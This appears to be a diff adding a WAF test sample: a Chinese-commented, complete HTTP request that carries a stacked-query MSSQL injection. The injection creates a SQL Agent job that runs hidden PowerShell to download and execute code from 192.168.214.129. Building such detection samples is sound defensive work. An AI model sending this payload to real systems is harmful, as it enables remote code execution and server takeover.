@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506427
+# 攻击者基于堆叠查询，将"exec sp_add_jobstep @job_name = N'test_powershell_job1' , @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://192.168.214.129:80/a''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'"语句注入到 SQL 查询参数中，目的是编写作业处理步骤。
+GET /?id=1%3Bexec%20sp_add_jobstep%20@job_name%20=%20N%27test_powershell_job1%27%20%2C%20@step_name%20=%20N%27test_powershell_name1%27%2C%20@subsystem%20=%20N%27PowerShell%27%2C%20@command%20=%20N%27powershell.exe%20-nop%20-w%20hidden%20-c%20%22IEX%20%28%28new-object%20net.webclient%29.downloadstring%28%27%27http:%2F%2F192.168.214.129:80%2Fa%27%27%29%29%22%27%2C%20@retry_attempts%20=%201%2C%20@retry_interval%20=%205%20%3BEXEC%20dbo.sp_add_jobserver%20@job_name%20=%20N%27test_powershell_job1%27&bid=hd_tag_m8mv26o5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26o5
+RM-PRO-Token: c619eb203872fd7a54c935465d3c647e
+RM-PRO-Time: 1742808643956
+User-Agent: curl/7.83.1
+
